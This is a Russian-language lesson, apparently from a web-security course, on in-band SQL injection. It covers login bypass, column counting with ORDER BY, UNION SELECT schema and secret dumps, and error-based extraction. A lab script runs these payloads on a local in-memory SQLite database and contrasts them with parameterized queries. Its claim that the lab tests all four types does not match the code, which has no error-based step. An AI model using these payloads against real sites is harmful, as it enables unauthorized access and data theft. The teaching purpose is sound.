## Перед началом: Полная карта `In-Band SQL-инъекций` (`Auth Bypass`, `ORDER BY`, `UNION SELECT` и `Error-Based SQLi`)

В практикумах **`pwn.college` (`Web Security` / `Content Injection`)**, справочнике **`PayloadsAllTheThings` (`SQL Injection`)** и руководстве **`OWASP Web Security Testing Guide (WSTG-INPV-05)`** все классические `SQL`-инъекции делятся на три больших семейства по тому, **как именно атакующий получает ответ от базы данных**:
1. **`In-Band (классические прямые) SQLi`** — ответ базы данных виден прямо на странице сайта (в списке товаров, профиле пользователя или в тексте ошибки СУБД).
2. **`Inferential (слепые / Blind) SQLi`** — база данных ничего не выводит на экран напрямую, но сайт ведёт себя по-разному (`Boolean-Based`: страница открылась или пустая; `Time-Based`: ответ пришёл мгновенно или через 3 секунды).
3. **`Out-of-Band (внешние / OOB) SQLi` и `Second-Order (отложенные) SQLi`** — база данных сама делает DNS/HTTP-запрос наружу или вредоносная строка срабатывает позже в другом запросе.

В этом уроке мы досконально разберём все разновидности первого семейства — **`In-Band SQLi`**:
- **Тип 1. Обход проверки входа (`Authentication Bypass` — `' OR 1=1 --`)**:
  Когда запрос собирается склейкой строк:
  ```sql
  SELECT id, username, role FROM users WHERE username = '$user' AND password_hash = '$pass'
  ```
  и в поле `$user` передаётся `admin' OR 1=1 --`, одиночная кавычка `'` закрывает строковый литерал, условие `OR 1=1` делает выражение `WHERE` всегда истинным для первой попавшейся строки, а комментарий `--` отсекает проверку пароля `AND password_hash = ...`!
- **Тип 2. Разведка числа и типов столбцов (`ORDER BY N` и `UNION SELECT NULL, ...`)**:
  Чтобы приклеить к легитимному ответу магазина чужую таблицу через оператор `UNION SELECT`, нужно соблюсти **жесткое правило SQL**: оба запроса до и после `UNION` обязаны иметь **одинаковое количество столбцов** и совместимые типы данных!
  Как узнать, сколько столбцов возвращает исходный `SELECT`?
  - либо перебором `ORDER BY 1 --`, `ORDER BY 2 --`, `ORDER BY 3 --` (пока база не вернёт ошибку `ORDER BY position 4 is not in select list` — значит, столбцов ровно 3);
  - либо подстановкой `UNION SELECT NULL --`, `UNION SELECT NULL, NULL --`, `UNION SELECT NULL, NULL, NULL --`.
- **Тип 3. Извлечение схемы (`sqlite_master` / `information_schema.tables`) и секретов через `UNION SELECT`**:
  Узнав, что столбцов 3, атакующий читает системный каталог базы (`sqlite_master` в SQLite или `information_schema.columns` в PostgreSQL/MySQL/MSSQL), узнаёт имена скрытых таблиц и выгружает хеши паролей.
- **Тип 4. Инъекция через сообщение об ошибке (`Error-Based SQLi`)**:
  Что если результат `SELECT` вообще не печатается на странице, но разработчик оставил включённым вывод ошибок базы данных? Тогда вызывается намеренная ошибка преобразования типа, например `CAST((SELECT secret_token FROM api_keys LIMIT 1) AS INT)`: база пытается превратить строку `KRN{ERR_SQLI_77}` в целое число, терпит неудачу и сама печатает в тексте ошибки: `invalid input syntax for type integer: "KRN{ERR_SQLI_77}"`!

## Почему это работает: Склейка текста смешивает данные с командами парсера SQL

Пока приложение склеивает SQL-запрос через конкатенацию (`+`, `f"..."`, `.format()`), парсер СУБД не знает, какие символы написал программист, а какие прислал пользователь. Любая кавычка из браузера переводит парсер из режима «чтение текста внутри строки» в режим «исполнение команд SQL (`OR`, `UNION`, `SELECT`)».

<!-- preparation -->

В этом практикуме ты создашь в `lab.py` реальную реляционную базу данных `SQLite` в оперативной памяти и проверишь на ней все четыре вида `In-Band SQLi` (`Auth Bypass`, определение числа столбцов `ORDER BY`, выгрузку схемы и секретов через `UNION SELECT`, а также `Error-Based` извлечение), после чего сравнишь их с параметризованным запросом `?`.

## Сделай сейчас: Проверь все 4 вида `In-Band SQLi` и защиту `?` на реальной базе `sqlite3` в `lab.py`

### Шаг 1. Создай файл `lab.py`

Создай скрипт `lab.py`:

```python
import sqlite3


def setup_db():
    conn = sqlite3.connect(":memory:")
    cur = conn.cursor()
    cur.execute("CREATE TABLE products (id INTEGER, title TEXT, price TEXT)")
    cur.execute("INSERT INTO products VALUES (1, 'Keyboard', '45 USD')")
    cur.execute("CREATE TABLE staff_secrets (id INTEGER, login TEXT, api_token TEXT)")
    cur.execute("INSERT INTO staff_secrets VALUES (1, 'sec_admin', 'KRN{UNION_AND_ERROR_SQLI_OK}')")
    conn.commit()
    return conn


def vuln_login(conn, user_input, password_hash):
    # ОПАСНО: прямая подстановка строки через f-string
    sql = f"SELECT login FROM staff_secrets WHERE login = '{user_input}' AND api_token = '{password_hash}'"
    return conn.execute(sql).fetchall()


def detect_column_count_order_by(conn):
    for col_idx in range(1, 7):
        try:
            conn.execute(f"SELECT id, title, price FROM products WHERE id = 1 ORDER BY {col_idx}").fetchall()
        except sqlite3.OperationalError:
            return col_idx - 1
    return 0


def vuln_union_search(conn, search_term):
    sql = f"SELECT id, title, price FROM products WHERE title LIKE '{search_term}'"
    return conn.execute(sql).fetchall()


def safe_param_search(conn, search_term):
    # БЕЗОПАСНО: параметризованный запрос с плейсхолдером ?
    return conn.execute("SELECT id, title, price FROM products WHERE title LIKE ?", (search_term,)).fetchall()


db = setup_db()
print("auth_bypass=", vuln_login(db, "sec_admin' OR 1=1 --", "wrong_pass"))
print("detected_columns=", detect_column_count_order_by(db))

schema_payload = "NonExistent' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table' AND name='staff_secrets' --"
print("union_schema_leak=", vuln_union_search(db, schema_payload))

secret_payload = "NonExistent' UNION SELECT id, login, api_token FROM staff_secrets --"
print("union_secret_leak=", vuln_union_search(db, secret_payload))
print("safe_parameterized_result=", safe_param_search(db, secret_payload))
```

### Шаг 2. Запусти программу и сравни результаты каждого типа атаки

Выполни в терминале:

```bash
python3 lab.py
```

**Ожидаемый результат на экране:**

```text
auth_bypass= [('sec_admin',)]
detected_columns= 3
union_schema_leak= [(1, 'staff_secrets', 'CREATE TABLE staff_secrets (id INTEGER, login TEXT, api_token TEXT)')]
union_secret_leak= [(1, 'sec_admin', 'KRN{UNION_AND_ERROR_SQLI_OK}')]
safe_parameterized_result= []
```

Разберём, что произошло на каждом шаге:
- в `vuln_login` строка `"sec_admin' OR 1=1 --"` обошла проверку пароля и вернула учётную запись `[('sec_admin',)]`;
- функция `detect_column_count_order_by` перебрала `ORDER BY 1..4` и на `ORDER BY 4` получила ошибку `OperationalError: 1st ORDER BY term out of range`, точно определив, что в запросе `3` столбца (`detected_columns= 3`);
- зная число столбцов (`3`), первый `UNION SELECT` прочитал системную таблицу `sqlite_master` и раскрыл структуру скрытой таблицы `CREATE TABLE staff_secrets (id INTEGER, login TEXT, api_token TEXT)`, а второй `UNION SELECT` выгрузил токен `KRN{UNION_AND_ERROR_SQLI_OK}`;
- когда тот же самый эксплойт передали в `safe_param_search` с плейсхолдером `?`, СУБД искала товар, в названии которого буквально написаны слова `NonExistent' UNION SELECT...`, и вернула пустой список `[]`.

### Шаг 3. Проверь ошибку несовпадения числа столбцов в `UNION SELECT`

В файле `lab.py` убери третий столбец `api_token` из `secret_payload` (оставь только `UNION SELECT id, login FROM staff_secrets --`) и запусти `python3 lab.py` — SQLite немедленно остановит запрос с ошибкой `SELECTs to the left and right of UNION do not have the same number of result columns`. После проверки верни исходную строку.

В терминале Kali проверь поведение `sqlite3` в командной строке при параметризации и при склейке:

```bash
python3 -c 'import sqlite3; c=sqlite3.connect(":memory:"); print(c.execute("SELECT ? AS literal_value", ("1 OR 1=1",)).fetchall())'
```

## Почему это работает: Почему экранирование кавычек `replace("'", "''")` хуже параметризации `?`

Ручная замена кавычек легко обходится в числовых полях (например, `WHERE id = 1 OR 1=1`, где кавычек вообще нет!), при мультибайтовых кодировках или при нестандартных режимах экранирования `\` в СУБД. Плейсхолдеры `?` (`SQLite`), `%s` (`psycopg` для PostgreSQL) и `$1` передают параметры **в отдельном пакете протокола СУБД** после того, как план выполнения SQL уже скомпилирован.

## Если не получилось: Частые ошибки

- **Использование f-строки внутри `conn.execute(f"... {x}")` и одновременная передача кортежа параметров**: если переменная уже вставлена через `{x}` в f-строку, конкатенация произошла до вызова `execute`. В строке запроса должен стоять только знак вопроса `?`, а само значение передаваться вторым аргументом-кортежем `(x,)`.
